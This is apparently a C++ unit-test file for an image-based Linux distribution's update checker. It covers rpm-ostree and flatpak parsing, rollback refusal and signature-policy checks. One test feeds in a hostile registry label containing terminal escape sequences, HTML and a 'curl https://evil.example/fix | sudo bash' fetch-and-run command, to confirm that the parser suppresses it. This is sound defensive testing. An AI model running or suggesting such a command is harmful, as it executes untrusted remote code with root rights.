#include <gtest/gtest.h>

#include <nexus/system/update.hpp>

#include <filesystem>
#include <string>
#include <unistd.h>

using namespace nexus::system;

// The shape rpm-ostree prints for a container-image origin with an
// update found by the automatic check. Field order and padding vary
// between versions, so the tests vary them too.
static const char* kAvailable =
    "State: idle\n"
    "AutomaticUpdates: check; rpm-ostreed-automatic.timer: last run 3h ago\n"
    "Deployments:\n"
    "\xe2\x97\x8f ostree-image-signed:docker://ghcr.io/x/nexus-core:minimal\n"
    "                   Digest: sha256:aaa\n"
    "                  Version: 44.20261004.0 (2026-10-04T10:00:00Z)\n"
    "          LayeredPackages: aircrack-ng gobuster\n"
    "          AvailableUpdate:\n"
    "                  Version: 44.20261005.0 (2026-10-05T09:00:00Z)\n"
    "                   Digest: sha256:bbb\n"
    "                     Diff: 12 upgraded, 1 added\n"
    "\n"
    "  ostree-image-signed:docker://ghcr.io/x/nexus-core:minimal\n"
    "                  Version: 44.20261001.0 (2026-10-01T10:00:00Z)\n";

TEST(UpdateTest, ReadsTheAvailableUpdateNotTheRunningVersion) {
    const auto u = parseSystemUpdate(kAvailable);
    EXPECT_TRUE(u.available);
    EXPECT_EQ(u.version, "44.20261005.0");
    EXPECT_EQ(u.date, "2026-10-05T09:00:00Z");
    EXPECT_EQ(u.diff, "12 upgraded, 1 added");
    EXPECT_EQ(u.policy, "check");
    EXPECT_EQ(u.lastCheck, "rpm-ostreed-automatic.timer: last run 3h ago");
    EXPECT_FALSE(u.staged);
}

TEST(UpdateTest, NothingNewIsNothingNew) {
    const auto u = parseSystemUpdate(
        "State: idle\n"
        "AutomaticUpdates: disabled\n"
        "Deployments:\n"
        "\xe2\x97\x8f ostree-image-signed:docker://x\n"
        "                  Version: 44.1 (2026-10-04T10:00:00Z)\n");
    EXPECT_FALSE(u.available);
    EXPECT_EQ(u.policy, "disabled");
    EXPECT_TRUE(u.lastCheck.empty());
    EXPECT_EQ(updateSummary(u, {}), "");
}

TEST(UpdateTest, SeesAStagedDeployment) {
    const auto u = parseSystemUpdate(
        "State: idle\n"
        "Deployments:\n"
        "  ostree-image-signed:docker://x\n"
        "                  Version: 44.2 (2026-10-05T10:00:00Z)\n"
        "                   Staged: yes\n"
        "\xe2\x97\x8f ostree-image-signed:docker://x\n"
        "                  Version: 44.1 (2026-10-04T10:00:00Z)\n");
    EXPECT_TRUE(u.staged);
    EXPECT_EQ(u.stagedVersion, "44.2");
    EXPECT_FALSE(u.available);
}

TEST(UpdateTest, ReadsFlatpakUpdatesAndSkipsTheRest) {
    const auto apps = parseFlatpakUpdates(
        "org.mozilla.firefox\t131.0\n"
        "com.heroicgameslauncher.hgl\n"
        "Looking for updates...\n"
        "\n");
    ASSERT_EQ(apps.size(), 2u);
    EXPECT_EQ(apps[0].id, "org.mozilla.firefox");
    EXPECT_EQ(apps[0].version, "131.0");
    EXPECT_EQ(apps[1].version, "");
}

// Round 3 (0.1.86, R1): the version column is the app developer's
// text and goes into the notification and the Shop.
TEST(UpdateTest, FlatpakVersionIsPrintable) {
    const auto apps = parseFlatpakUpdates(
        "org.example.App\t1.0\x1b]52;c;aWQ=\x07\n"
        "org.example.Bidi\t2.0\xe2\x80\xae" "evil\n"
        "org.example.Long\t" + std::string(200, '9') + "\n");
    ASSERT_EQ(apps.size(), 3u);
    EXPECT_EQ(apps[0].version, "1.0?]52;c;aWQ=?");
    EXPECT_EQ(apps[1].version, "2.0?evil");
    EXPECT_EQ(apps[2].version.size(), 64u);
}

TEST(UpdateTest, FlatpakIdsWithOddCharactersAreSkipped) {
    const auto apps = parseFlatpakUpdates(
        "org.example.\x1b[2JApp\t1.0\n"
        "org.exa\xe2\x80\x8bmple.App\t1.0\n"
        "org.example.Fine_App-2\t1.0\n");
    ASSERT_EQ(apps.size(), 1u);
    EXPECT_EQ(apps[0].id, "org.example.Fine_App-2");
}

// Round 3 (0.1.86, P5): the daily check can be turned off per account.
TEST(UpdateTest, NotifySwitchWritesAndRemovesTheFlag) {
    namespace fs = std::filesystem;
    const fs::path home = fs::temp_directory_path() /
        ("nexus-notify-test-" + std::to_string(::getpid()));
    fs::remove_all(home);
    fs::create_directories(home);
    std::string error;

    EXPECT_FALSE(updateNotifyIsOff(home.string()));
    EXPECT_EQ(updateNotifyOffFile(home.string()),
              home.string() + "/.config/nexus/update-notify-off");

    ASSERT_TRUE(setUpdateNotify(home.string(), false, error)) << error;
    EXPECT_TRUE(updateNotifyIsOff(home.string()));
    EXPECT_TRUE(fs::is_regular_file(home / ".config/nexus/update-notify-off"));
    // Twice is fine.
    ASSERT_TRUE(setUpdateNotify(home.string(), false, error)) << error;

    ASSERT_TRUE(setUpdateNotify(home.string(), true, error)) << error;
    EXPECT_FALSE(updateNotifyIsOff(home.string()));
    // On when already on: nothing to remove, not an error.
    EXPECT_TRUE(setUpdateNotify(home.string(), true, error)) << error;

    EXPECT_FALSE(setUpdateNotify("", false, error));
    EXPECT_FALSE(setUpdateNotify("relative/home", false, error));
    EXPECT_FALSE(updateNotifyIsOff(""));
    fs::remove_all(home);
}

TEST(UpdateTest, SummarisesForANotification) {
    const auto u = parseSystemUpdate(kAvailable);
    EXPECT_EQ(updateSummary(u, {{"org.a.b", ""}, {"org.c.d", ""}}),
              "Nexus 44.20261005.0 and 2 app updates");
    EXPECT_EQ(updateSummary(SystemUpdate{}, {{"org.a.b", ""}}),
              "1 app update");
}

static const char* kRunning =
    "State: idle\n"
    "Deployments:\n"
    "\xe2\x97\x8f ostree-image-signed:docker://ghcr.io/x/nexus-core:minimal\n"
    "                   Digest: sha256:7551\n"
    "                  Version: 44.20261002.0 (2026-10-04T13:19:59Z)\n"
    "\n"
    "  ostree-image-signed:docker://ghcr.io/x/nexus-core:minimal\n"
    "                   Digest: sha256:3706\n"
    "                  Version: 44.20261002.0 (2026-10-04T11:24:47Z)\n";

// skopeo inspect as the Asus printed it, 4 October (shortened).
static const char* kInspect = R"({
    "Name": "ghcr.io/x/nexus-core",
    "Digest": "sha256:9999",
    "Created": "2026-10-05T14:18:53.528859441Z",
    "Labels": {
        "containers.bootc": "1",
        "nexus.version": "0.1.32",
        "org.opencontainers.image.version": "44.20261002.0"
    },
    "Layers": ["sha256:bb9f"]
})";

TEST(UpdateTest, ReadsWhatTheMachineRuns) {
    const auto u = parseSystemUpdate(kRunning);
    EXPECT_EQ(u.origin, "ghcr.io/x/nexus-core:minimal");
    EXPECT_EQ(u.digest, "sha256:7551");
    EXPECT_FALSE(u.staged);
}

TEST(UpdateTest, ImageReferenceDropsTheTransport) {
    EXPECT_EQ(imageReference("ostree-image-signed:docker://ghcr.io/a/b:c"),
              "ghcr.io/a/b:c");
    EXPECT_EQ(imageReference("ostree-unverified-registry:docker://q/r:s"),
              "q/r:s");
    EXPECT_EQ(imageReference("fedora:fedora/44/x86_64/silverblue"), "");
}

TEST(UpdateTest, ANewDigestOnTheRegistryIsAnUpdate) {
    auto u = parseSystemUpdate(kRunning);
    const auto remote = parseImageInspect(kInspect);
    ASSERT_TRUE(remote.ok);
    EXPECT_EQ(remote.nexusVersion, "0.1.32");
    compareWithRegistry(u, remote);
    EXPECT_TRUE(u.available);
    EXPECT_EQ(u.version, "0.1.32");
    EXPECT_EQ(updateSummary(u, {}), "Nexus 0.1.32");
}

TEST(UpdateTest, TheSameDigestIsUpToDate) {
    auto u = parseSystemUpdate(kRunning);
    RemoteImage same;
    same.ok = true;
    same.digest = "sha256:7551";
    compareWithRegistry(u, same);
    EXPECT_FALSE(u.available);
}

TEST(UpdateTest, AStagedDigestIsNotOfferedTwice) {
    auto u = parseSystemUpdate(
        "Deployments:\n"
        "  ostree-image-signed:docker://ghcr.io/x/y:z\n"
        "                   Staged: yes\n"
        "                   Digest: sha256:9999\n"
        "\xe2\x97\x8f ostree-image-signed:docker://ghcr.io/x/y:z\n"
        "                   Digest: sha256:7551\n");
    EXPECT_TRUE(u.staged);
    EXPECT_EQ(u.stagedDigest, "sha256:9999");
    compareWithRegistry(u, parseImageInspect(kInspect));
    EXPECT_FALSE(u.available);
}

TEST(UpdateTest, NoLabelStillSaysSomethingReadable) {
    auto u = parseSystemUpdate(kRunning);
    RemoteImage remote;
    remote.ok = true;
    remote.digest = "sha256:8888";
    compareWithRegistry(u, remote);
    EXPECT_EQ(updateSummary(u, {}), "A new Nexus version");
    EXPECT_FALSE(parseImageInspect("not json").ok);
}

TEST(UpdateTest, ReadsTheLinesTheShopReads) {
    const auto u = parseUpdateLines(
        "running\t0.1.38\t9 October\n"
        "staged\t0.1.39\n"
        "system\tnew\t0.1.39, rebuilt with Fedora's latest updates\t"
        "10 October\t12 upgraded\n"
        "app\torg.videolan.VLC\t3.0.21\n"
        "app\tcom.obsproject.Studio\t\n"
        "future\tsomething a newer nexus prints\n"
        "\n");
    EXPECT_EQ(u.running, "0.1.38");
    EXPECT_EQ(u.runningDay, "9 October");
    EXPECT_EQ(u.staged, "0.1.39");
    EXPECT_EQ(u.system, "new");
    EXPECT_EQ(u.version, "0.1.39, rebuilt with Fedora's latest updates");
    EXPECT_EQ(u.day, "10 October");
    EXPECT_EQ(u.diff, "12 upgraded");
    ASSERT_EQ(u.apps.size(), 2u);
    EXPECT_EQ(u.apps[0].id, "org.videolan.VLC");
    EXPECT_EQ(u.apps[0].version, "3.0.21");
    EXPECT_EQ(u.apps[1].version, "");
}

TEST(UpdateTest, LinesFromAMachineThatIsNotImageBased) {
    const auto u = parseUpdateLines("system\tnot-image\t\t\t\n");
    EXPECT_EQ(u.system, "not-image");
    EXPECT_TRUE(u.apps.empty());
    EXPECT_EQ(parseUpdateLines("").system, "");
}

// Outside review, round 2 (0.1.85, N1): the nexus.version label of an
// unsigned registry image went, as written, into every machine's
// notification, the terminal and the Shop's rows.
TEST(UpdateTest, AHostileLabelIsNotShown) {
    const std::string json =
        R"({"Digest":"sha256:)" + std::string(64, 'b') + R"(","Created":"2026-11-11T05:00:00Z",)"
        R"("Labels":{"nexus.version":"0.2.0 \u001b]0;pwned\u0007\u001b[2J CRITICAL fix: run curl https://evil.example/fix | sudo bash <a href=\"x\">details</a>\tapp\tfake"}})";
    const auto remote = nexus::system::parseImageInspect(json);
    ASSERT_TRUE(remote.ok);
    EXPECT_EQ(remote.nexusVersion, "");

    nexus::system::SystemUpdate system;
    system.digest = "sha256:" + std::string(64, 'a');
    nexus::system::compareWithRegistry(system, remote);
    EXPECT_TRUE(system.available);
    EXPECT_EQ(nexus::system::updateSummary(system, {}), "A new Nexus version");

    // A plain version still shows.
    const auto fine = nexus::system::parseImageInspect(
        R"({"Digest":"sha256:)" + std::string(64, 'c') + R"(","Labels":{"nexus.version":"0.1.85"}})");
    EXPECT_EQ(fine.nexusVersion, "0.1.85");
    EXPECT_EQ(nexus::system::parseImageInspect(
        R"({"Digest":"sha256:)" + std::string(64, 'c') + R"(","Created":"2026<b>","Labels":{}})").created, "");
}

// ---------------------------------------------------------------------
// 0.1.95, round-4 audit M5: an old signed build is not an update.
//
// What the Asus would show on 14 November, with one deployment kept
// from the week before.
static const char* kRunningNovember =
    "State: idle\n"
    "Deployments:\n"
    "\xe2\x97\x8f ostree-image-signed:docker://ghcr.io/davidosdas-official/nexus-core:kde\n"
    "                   Digest: sha256:1111\n"
    "                  Version: 44.20261109.0 (2026-11-10T03:41:07Z)\n"
    "          LayeredPackages: gcc nmap\n"
    "\n"
    "  ostree-image-signed:docker://ghcr.io/davidosdas-official/nexus-core:kde\n"
    "                   Digest: sha256:0000\n"
    "                  Version: 44.20261102.0 (2026-11-03T03:40:12Z)\n";

static RunningBuild runningNovember() {
    RunningBuild running;
    running.version = "0.1.95";
    running.built = "2026-11-10T03:41:07Z";
    running.buildId = "20261110";
    return running;
}

static RemoteImage offer(const std::string& digest, const std::string& created,
                         const std::string& version) {
    RemoteImage remote;
    remote.ok = true;
    remote.digest = digest;
    remote.created = created;
    remote.nexusVersion = version;
    return remote;
}

TEST(UpdateRollbackTest, ReadsBuildTimesTheWaySkopeoAndRpmOstreeWriteThem) {
    // 2026-11-10T03:41:07Z is 1794282067 seconds after 1970.
    EXPECT_EQ(parseBuildTime("2026-11-10T03:41:07Z"), 1794282067LL);
    EXPECT_EQ(parseBuildTime("2026-11-10T03:41:07.528859441Z"), 1794282067LL);
    EXPECT_EQ(parseBuildTime("2026-11-10T03:41:07"), 1794282067LL);
    EXPECT_EQ(parseBuildTime("2026-11-10T05:41:07+02:00"), 1794282067LL);
    EXPECT_EQ(parseBuildTime("2026-11-09T22:41:07-0500"), 1794282067LL);
    EXPECT_EQ(parseBuildTime("1970-01-01T00:00:00Z"), 0LL);
    EXPECT_EQ(parseBuildTime("2024-02-29T00:00:00Z"), 1709164800LL);

    for (const char* bad : {"", "2026-11-10", "2026-11-10T03:41", "2026-13-10T03:41:07Z",
                            "2026-02-30T03:41:07Z", "2026-11-10T24:00:00Z",
                            "2026-11-10T03:41:07X", "2026-11-10T03:41:07Zjunk",
                            "2026-11-10T03:41:07.Z", "yesterday", "9999999999",
                            "2026-11-10T03:41:07+99:00", "1969-12-31T23:59:59Z"}) {
        EXPECT_FALSE(parseBuildTime(bad).has_value()) << bad;
    }

    EXPECT_EQ(parseBuildId("20261110"), 1794268800LL);
    for (const char* bad : {"", "2026111", "202611100", "2026-11-10", "20261310",
                            "20260230", "abcdefgh"}) {
        EXPECT_FALSE(parseBuildId(bad).has_value()) << bad;
    }
}

TEST(UpdateRollbackTest, ANewerBuildIsTaken) {
    const auto next = judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55.1Z", "0.1.96"));
    EXPECT_EQ(next.order, OfferOrder::NotOlder);
    EXPECT_FALSE(next.refused());
    EXPECT_TRUE(next.reason.empty());

    // The weekly rebuild: the same Nexus version, built later.
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.95")).refused());
    // Built later the same day (a security-watch rebuild).
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-10T09:00:00Z", "0.1.95")).refused());
    // The very same second is not older.
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-10T03:41:07.9Z", "0.1.95")).refused());
}

TEST(UpdateRollbackTest, AnOlderVersionIsRefused) {
    // Even with a date that claims to be newer: the version is lower.
    const auto old = judgeOffer(runningNovember(),
        offer("sha256:0abc", "2026-11-20T00:00:00Z", "0.1.90"));
    EXPECT_EQ(old.order, OfferOrder::OlderVersion);
    EXPECT_TRUE(old.refused());
    EXPECT_NE(old.reason.find("0.1.90"), std::string::npos) << old.reason;
    EXPECT_NE(old.reason.find("0.1.95"), std::string::npos) << old.reason;

    // Numbers, not text: 0.1.100 is newer than 0.1.95, 0.1.9 older.
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.100")).refused());
    EXPECT_EQ(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.9")).order,
        OfferOrder::OlderVersion);
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.2")).refused());
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.95.0")).refused());
    // Digits beyond any integer do not overflow into "older".
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z",
              "0.1.99999999999999999999999999")).refused());
}

// 0.1.99 -> 0.2.0 (patch 129): a version step is newer, and the next
// one will be too. Compared as numbers, part by part: as text, 0.1.100
// sorts before 0.1.99, and that mistake would refuse a real update as
// "older".
TEST(UpdateRollbackTest, AVersionStepIsNewerNotOlder) {
    RunningBuild running = runningNovember();
    running.version = "0.1.99";
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.2.0")).refused());
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.100")).refused());
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "1.0.0")).refused());

    // And back across the step is older, whatever the date says.
    running.version = "0.2.0";
    for (const char* older : {"0.1.99", "0.1.100", "0.1.999", "0.1"}) {
        EXPECT_EQ(judgeOffer(running,
            offer("sha256:0abc", "2026-11-20T00:00:00Z", older)).order,
            OfferOrder::OlderVersion) << older;
    }
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.2.1")).refused());
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.2")).refused());   // 0.2 == 0.2.0
    EXPECT_FALSE(judgeOffer(running,
        offer("sha256:2222", "2026-11-17T03:40:55Z", "0.10.0")).refused());
}

TEST(UpdateRollbackTest, AnOlderBuildOfTheSameVersionIsRefused) {
    // Last week's build of the same version: the replay a version
    // number alone would not catch.
    const auto old = judgeOffer(runningNovember(),
        offer("sha256:0000", "2026-11-03T03:40:12Z", "0.1.95"));
    EXPECT_EQ(old.order, OfferOrder::OlderBuild);
    EXPECT_NE(old.reason.find("2026-11-03 03:40 UTC"), std::string::npos) << old.reason;
    EXPECT_NE(old.reason.find("2026-11-10 03:41 UTC"), std::string::npos) << old.reason;

    // One second older is older.
    EXPECT_EQ(judgeOffer(runningNovember(),
        offer("sha256:0000", "2026-11-10T03:41:06Z", "0.1.95")).order,
        OfferOrder::OlderBuild);
    // An offer with no version label is judged by its date alone.
    EXPECT_EQ(judgeOffer(runningNovember(),
        offer("sha256:0000", "2026-11-03T03:40:12Z", "")).order,
        OfferOrder::OlderBuild);
    EXPECT_FALSE(judgeOffer(runningNovember(),
        offer("sha256:2222", "2026-11-17T03:40:55Z", "")).refused());
}

TEST(UpdateRollbackTest, AnOfferThatDoesNotSayWhenItWasBuiltIsRefused) {
    for (const char* created : {"", "soon", "2026-11-17"}) {
        const auto v = judgeOffer(runningNovember(), offer("sha256:2222", created, "0.1.96"));
        EXPECT_EQ(v.order, OfferOrder::Undated) << created;
        EXPECT_TRUE(v.refused());
    }
}

TEST(UpdateRollbackTest, WithoutRpmOstreesTimeTheBuildIdIsTheFloor) {
    RunningBuild running = runningNovember();
    running.built.clear();
    // Built any time on the BUILD_ID day or later: not older.
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "2026-11-10T00:00:00Z", "0.1.95")).refused());
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "2026-11-17T03:40:55Z", "0.1.95")).refused());
    // The day before: older.
    EXPECT_EQ(judgeOffer(running, offer("sha256:2", "2026-11-09T23:59:59Z", "0.1.95")).order,
              OfferOrder::OlderBuild);
}

TEST(UpdateRollbackTest, AMachineThatCannotDateItselfGoesByVersionOnly) {
    RunningBuild running;
    running.version = "0.1.95";
    // Not a Nexus image, rpm-ostree silent: no date of its own.
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "2020-01-01T00:00:00Z", "0.1.95")).refused());
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "", "0.1.96")).refused());
    EXPECT_EQ(judgeOffer(running, offer("sha256:2", "2030-01-01T00:00:00Z", "0.1.94")).order,
              OfferOrder::OlderVersion);
    // A version that is not plain numbers is not compared as one.
    running.version = "0.1.95-dirty";
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "", "0.1.94")).refused());
}

// rpm-ostree's timestamp and BUILD_ID name the same build. Where they
// do not agree, the earlier one is the floor: the check gets weaker,
// and can never turn a real update away.
TEST(UpdateRollbackTest, WhenTheTwoLocalDatesDisagreeTheEarlierOneCounts) {
    RunningBuild running = runningNovember();
    // A build over midnight: BUILD_ID the day before. Still the timestamp.
    running.buildId = "20261109";
    EXPECT_EQ(judgeOffer(running, offer("sha256:2", "2026-11-10T03:00:00Z", "0.1.95")).order,
              OfferOrder::OlderBuild);
    // A timestamp days after BUILD_ID is not the build's: BUILD_ID counts.
    running.buildId = "20261103";
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "2026-11-05T00:00:00Z", "0.1.95")).refused());
    EXPECT_EQ(judgeOffer(running, offer("sha256:2", "2026-11-02T23:00:00Z", "0.1.95")).order,
              OfferOrder::OlderBuild);
    // A timestamp before BUILD_ID: the timestamp counts.
    running.buildId = "20261115";
    EXPECT_FALSE(judgeOffer(running, offer("sha256:2", "2026-11-12T00:00:00Z", "0.1.95")).refused());
    EXPECT_EQ(judgeOffer(running, offer("sha256:2", "2026-11-10T03:00:00Z", "0.1.95")).order,
              OfferOrder::OlderBuild);
}

// The whole path `nexus update` takes: the old build is not "available",
// so it is neither announced (the notification's text is empty) nor
// installed, and the reason is kept for the person.
TEST(UpdateRollbackTest, AnOlderBuildOnTheRegistryIsNotAnUpdate) {
    auto u = parseSystemUpdate(kRunningNovember);
    EXPECT_EQ(u.built, "2026-11-10T03:41:07Z");
    RunningBuild running = runningNovember();
    running.built = u.built;

    compareWithRegistry(u, offer("sha256:0000", "2026-11-03T03:40:12Z", "0.1.94"), running);
    EXPECT_FALSE(u.available);
    EXPECT_TRUE(u.refused);
    EXPECT_FALSE(u.refusedWhy.empty());
    EXPECT_EQ(u.refusedVersion, "0.1.94");
    EXPECT_EQ(u.offeredDigest, "sha256:0000");
    EXPECT_EQ(updateSummary(u, {}), "");

    // The two-argument form is what 0.1.94 used, and what it did:
    auto before = parseSystemUpdate(kRunningNovember);
    compareWithRegistry(before, offer("sha256:0000", "2026-11-03T03:40:12Z", "0.1.94"));
    EXPECT_TRUE(before.available);
    EXPECT_EQ(updateSummary(before, {}), "Nexus 0.1.94");
}

TEST(UpdateRollbackTest, ANewerBuildOnTheRegistryStillIs) {
    auto u = parseSystemUpdate(kRunningNovember);
    RunningBuild running = runningNovember();
    compareWithRegistry(u, offer("sha256:2222", "2026-11-17T03:40:55Z", "0.1.96"), running);
    EXPECT_TRUE(u.available);
    EXPECT_FALSE(u.refused);
    EXPECT_EQ(u.version, "0.1.96");
    EXPECT_EQ(u.offeredDigest, "sha256:2222");
    EXPECT_EQ(updateSummary(u, {}), "Nexus 0.1.96");

    // The running build itself, offered again: nothing new, nothing refused.
    auto same = parseSystemUpdate(kRunningNovember);
    compareWithRegistry(same, offer("sha256:1111", "2026-11-10T03:41:07Z", "0.1.95"), running);
    EXPECT_FALSE(same.available);
    EXPECT_FALSE(same.refused);
}

// An update rpm-ostree's own earlier check had noted does not survive
// the registry answering with an older build now.
TEST(UpdateRollbackTest, ARefusedOfferOverridesRpmOstreesCachedUpdate) {
    auto u = parseSystemUpdate(kAvailable);
    ASSERT_TRUE(u.available);
    RunningBuild running;
    running.version = "0.1.95";
    running.built = u.built;
    EXPECT_EQ(u.built, "2026-10-04T10:00:00Z");
    compareWithRegistry(u, offer("sha256:0000", "2026-10-01T10:00:00Z", "0.1.95"), running);
    EXPECT_FALSE(u.available);
    EXPECT_TRUE(u.refused);
    EXPECT_TRUE(u.version.empty());
}

// ---------------------------------------------------------------------
// 0.1.95, round-4 audit L9: what was shown is what is staged.

// After `rpm-ostree upgrade`: the new deployment is listed above the
// booted one. No "Staged:" line -- plain `rpm-ostree status` on other
// Fedora systems prints none.
static std::string statusAfterUpgrade(const std::string& pendingDigest,
                                      const std::string& pendingBuilt) {
    return "State: idle\n"
           "Deployments:\n"
           "  ostree-image-signed:docker://ghcr.io/davidosdas-official/nexus-core:kde\n"
           "                   Digest: " + pendingDigest + "\n"
           "                  Version: 44.20261116.0 (" + pendingBuilt + ")\n"
           "                     Diff: 55 upgraded, 2 removed, 1 added\n"
           "\n"
           "\xe2\x97\x8f ostree-image-signed:docker://ghcr.io/davidosdas-official/nexus-core:kde\n"
           "                   Digest: sha256:1111\n"
           "                  Version: 44.20261109.0 (2026-11-10T03:41:07Z)\n"
           "          LayeredPackages: gcc nmap\n";
}

TEST(UpdateStagedTest, ReadsTheDeploymentThatStartsNext) {
    const auto before = parseSystemUpdate(kRunningNovember);
    EXPECT_TRUE(before.pendingDigest.empty());
    EXPECT_TRUE(before.pendingBuilt.empty());
    EXPECT_EQ(before.digest, "sha256:1111");

    const auto after = parseSystemUpdate(statusAfterUpgrade("sha256:2222", "2026-11-17T03:40:55Z"));
    EXPECT_EQ(after.pendingDigest, "sha256:2222");
    EXPECT_EQ(after.pendingBuilt, "2026-11-17T03:40:55Z");
    EXPECT_EQ(after.digest, "sha256:1111");
    EXPECT_EQ(after.built, "2026-11-10T03:41:07Z");
    // The rollback deployment, listed after the booted one, is not pending.
    EXPECT_NE(before.pendingDigest, "sha256:0000");
}

TEST(UpdateStagedTest, TheConfirmedBuildStagedIsAsConfirmed) {
    const auto before = parseSystemUpdate(kRunningNovember);
    const auto after = parseSystemUpdate(statusAfterUpgrade("sha256:2222", "2026-11-17T03:40:55Z"));
    EXPECT_EQ(judgeStaged("sha256:2222", before, after), StagedResult::AsConfirmed);
    // Already waiting before this run, and still the confirmed one.
    EXPECT_EQ(judgeStaged("sha256:2222", after, after), StagedResult::AsConfirmed);
}

TEST(UpdateStagedTest, AnotherBuildThanTheOneShownIsDifferent) {
    const auto before = parseSystemUpdate(kRunningNovember);
    // The tag moved between the check and the download.
    const auto after = parseSystemUpdate(statusAfterUpgrade("sha256:3333", "2026-11-17T09:00:00Z"));
    EXPECT_EQ(judgeStaged("sha256:2222", before, after), StagedResult::Different);
}

TEST(UpdateStagedTest, NothingStagedIsNothingNew) {
    const auto before = parseSystemUpdate(kRunningNovember);
    EXPECT_EQ(judgeStaged("sha256:2222", before, before), StagedResult::NothingNew);
    // What waited before this run and still waits is not this run's.
    const auto waiting = parseSystemUpdate(statusAfterUpgrade("sha256:3333", "2026-11-17T09:00:00Z"));
    EXPECT_EQ(judgeStaged("sha256:2222", waiting, waiting), StagedResult::NothingNew);
    EXPECT_EQ(judgeStaged("", waiting, waiting), StagedResult::NothingNew);
}

// The registry's description was not what was signed: the digest is the
// confirmed one, but rpm-ostree's own account dates it before the
// running build.
TEST(UpdateStagedTest, AStagedBuildOlderThanTheRunningOneIsOlder) {
    const auto before = parseSystemUpdate(kRunningNovember);
    const auto after = parseSystemUpdate(statusAfterUpgrade("sha256:2222", "2026-11-03T03:40:12Z"));
    EXPECT_EQ(judgeStaged("sha256:2222", before, after), StagedResult::Older);
    // With no digest to confirm (no skopeo), the age is still checked.
    EXPECT_EQ(judgeStaged("", before, after), StagedResult::Older);
    const auto newer = parseSystemUpdate(statusAfterUpgrade("sha256:2222", "2026-11-17T03:40:55Z"));
    EXPECT_EQ(judgeStaged("", before, newer), StagedResult::AsConfirmed);
}

// ---------------------------------------------------------------------
// 0.1.95, round-4 audit L1: one answer to "are updates signature-checked?"

static const char* kPolicyWithKey = R"({
    "default": [{"type": "reject"}],
    "transports": {"docker": {
        "": [{"type": "insecureAcceptAnything"}],
        "ghcr.io/davidosdas-official": [{"type": "sigstoreSigned",
            "keyPath": "/etc/pki/containers/nexus-core.pub",
            "signedIdentity": {"type": "matchRepository"}}]
    }}
})";

static const char* kPolicyWithoutKey = R"({
    "default": [{"type": "insecureAcceptAnything"}],
    "transports": {"docker-daemon": {"": [{"type": "insecureAcceptAnything"}]}}
})";

TEST(UpdateSigningTest, OneAnswerForEveryCommand) {
    const std::string nexusSigned =
        "ostree-image-signed:docker://ghcr.io/davidosdas-official/nexus-core:kde";
    const std::string nexusUnverified =
        "ostree-unverified-registry:ghcr.io/davidosdas-official/nexus-core:kde";

    EXPECT_EQ(judgeUpdateSigning(nexusSigned, kPolicyWithKey, true), UpdateSigning::Enforced);
    // The prefix alone is not a check (what the summary and specs went by).
    EXPECT_EQ(judgeUpdateSigning(nexusSigned, kPolicyWithoutKey, true), UpdateSigning::PolicyMissing);
    EXPECT_EQ(judgeUpdateSigning(nexusSigned, "", true), UpdateSigning::PolicyMissing);
    EXPECT_EQ(judgeUpdateSigning(nexusSigned, "not json", true), UpdateSigning::PolicyMissing);
    // The rule without the key file checks against nothing.
    EXPECT_EQ(judgeUpdateSigning(nexusSigned, kPolicyWithKey, false), UpdateSigning::PolicyMissing);
    // Not signature-checked at all (what doctor called "signed images").
    EXPECT_EQ(judgeUpdateSigning(nexusUnverified, kPolicyWithKey, true), UpdateSigning::NotChecked);
    EXPECT_EQ(judgeUpdateSigning("fedora:fedora/44/x86_64/silverblue", kPolicyWithKey, true),
              UpdateSigning::NotChecked);
    // Another project's signed image: checked, but not against Nexus's key.
    EXPECT_EQ(judgeUpdateSigning("ostree-image-signed:docker://quay.io/fedora/fedora-kinoite:44",
                                 kPolicyWithoutKey, false),
              UpdateSigning::OtherSigned);
    EXPECT_EQ(judgeUpdateSigning("", kPolicyWithKey, true), UpdateSigning::NotAnImage);
}
